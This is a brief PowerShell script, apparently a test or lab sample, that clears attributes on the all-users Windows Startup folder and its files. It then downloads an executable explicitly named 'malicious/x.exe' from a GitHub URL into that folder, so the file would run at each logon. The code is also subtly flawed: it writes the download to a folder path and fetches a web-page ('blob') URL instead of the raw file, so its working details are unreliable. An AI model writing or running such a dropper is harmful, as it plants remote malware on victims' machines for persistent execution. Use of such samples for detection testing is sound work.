$path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Set-ItemProperty -Path $path -Name Attributes -Value ([IO.FileAttributes]::Directory)
Get-ChildItem -Path $path -Recurse -Force | ForEach-Object {
    Set-ItemProperty -Path $_.FullName -Name Attributes -Value ([IO.FileAttributes]::Normal)
}


Invoke-WebRequest 'https://github.com/steven-noel-cruz/test/blob/e32920b305ec39f50046a37ce4b7c89af1071f3a/malicious/x.exe' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'